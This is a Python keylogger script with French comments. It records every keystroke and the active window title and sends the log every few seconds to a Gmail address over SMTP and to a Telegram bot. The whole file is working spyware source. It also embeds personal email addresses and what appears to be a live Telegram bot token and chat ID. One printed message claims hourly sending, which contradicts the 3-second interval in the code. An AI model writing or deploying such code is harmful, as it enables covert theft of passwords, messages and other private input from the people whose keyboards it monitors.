from pynput import keyboard 
import pygetwindow as gw 
import time 
import smtplib 
import threading 
import asyncio 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import telegram 
from datetime import datetime 

# --- CONFIGURATION DE L'ENVOI D'EMAIL ---
EMAIL_ADDRESS = "nkenfackloic2002@gmail.com"
EMAIL_PASSWORD = "votre_mot_de_passe_application"
RECIPIENT_EMAIL = "nkenfacklandoloic@gmail.com"
SEND_INTERVAL = 3  # Intervalle d'envoi en secondes
LOG_FILE = "keylog.log"

# --- CONFIGURATION DE L'ENVOI TELEGRAM ---
TELEGRAM_BOT_TOKEN = "8018867438:AAFPnVkkSuND4R1bbqU5B6lDiAFFJFWQoKI"
TELEGRAM_CHAT_ID = "5622778224"

# Variables globales
count = 0
active_window = ""
log_lock = threading.Lock()

def on_press(key):
    global count, active_window

    try:
        current_window = gw.getActiveWindow().title
        if current_window != active_window:
            active_window = current_window
            with log_lock:
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"\n\n[WINDOW: {active_window} - {timestamp}]\n")
    except Exception:
        pass

    with log_lock:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            try:
                f.write(f"['{key.char}']")
            except AttributeError:
                if key == keyboard.Key.enter:
                    f.write("[ENTER]\n")
                    count = 0
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    f.write("[CTRL]")
                else:
                    f.write(f"[{key}]")
            count += 1
            if count >= 20:
                f.write("\n")
                count = 0

    if key == keyboard.Key.esc:
        return False

def send_log_by_email():
    with log_lock:
        try:
            with open(LOG_FILE, "r+", encoding="utf-8") as f:
                log_content = f.read()
                if not log_content.strip():
                    print("Fichier de log vide, pas d'envoi.")
                    return

                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = RECIPIENT_EMAIL
                msg['Subject'] = f"Keylog Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

                body = "Rapport des frappes clavier en pièce jointe."
                msg.attach(MIMEText(body, 'plain'))

                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(log_content.encode('utf-8'))
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', f"attachment; filename= {LOG_FILE}")
                msg.attach(attachment)

                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                text = msg.as_string()
                server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
                server.quit()

                f.seek(0)
                f.truncate()
                print(f"Log envoyé à {RECIPIENT_EMAIL} et fichier vidé.")

        except FileNotFoundError:
            print("Fichier de log non trouvé. Il sera créé à la prochaine frappe.")
        except Exception as e:
            print(f"Erreur lors de l'envoi de l'email: {e}")

async def send_log_by_telegram():
    with log_lock:
        try:
            with open(LOG_FILE, "rb") as f:
                log_content = f.read()
                if not log_content.strip():
                    print("Fichier de log vide, pas d'envoi Telegram.")
                    return

                f.seek(0)
                bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
                caption = f"Rapport Keylogger - {time.strftime('%Y-%m-%d %H:%M:%S')}"
                await bot.send_document(
                    chat_id=TELEGRAM_CHAT_ID,
                    document=f,
                    filename=LOG_FILE,
                    caption=caption
                )
                print(f"Log envoyé à Telegram (Chat ID: {TELEGRAM_CHAT_ID}).")

        except FileNotFoundError:
            pass
        except Exception as e:
            print(f"Erreur lors de l'envoi sur Telegram: {e}")

def report():
    while True:
        time.sleep(SEND_INTERVAL)
        send_log_by_email()
        asyncio.run(send_log_by_telegram())

def test_telegram_connection():
    try:
        bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="Test de connexion du bot")
        print("Message de test envoyé avec succès!")
    except Exception as e:
        print(f"Erreur lors du test Telegram: {e}")

if __name__ == "__main__":
    test_telegram_connection()
    report_thread = threading.Thread(target=report, daemon=True)
    report_thread.start()
    print("Keylogger démarré. Envoi des logs toutes les heures. Appuyez sur 'Echap' pour arrêter.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()